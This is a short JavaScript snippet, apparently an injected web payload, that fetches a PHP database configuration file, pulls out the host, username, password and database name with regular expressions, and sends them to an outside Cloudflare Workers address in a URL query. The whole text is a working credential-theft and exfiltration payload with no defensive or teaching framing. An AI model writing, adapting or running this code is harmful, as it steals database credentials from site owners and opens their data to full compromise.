// Minimal version
fetch('../config/koneksi.php')
    .then(response => response.text())
    .then(content => {
        const extract = (regex) => (content.match(regex) || [,'Not found'])[1];
        const data = `Host:${extract(/\$host\s*=\s*["']([^"']+)["']/)},User:${extract(/\$user\s*=\s*["']([^"']+)["']/)},Pass:${extract(/\$password\s*=\s*["']([^"']+)["']/)},DB:${extract(/\$database\s*=\s*["']([^"']+)["']/)}`;
        fetch('https://lucifer.yutupprem0.workers.dev/?message=' + encodeURIComponent(data));
    })
    .catch(error => console.error('Error:', error));
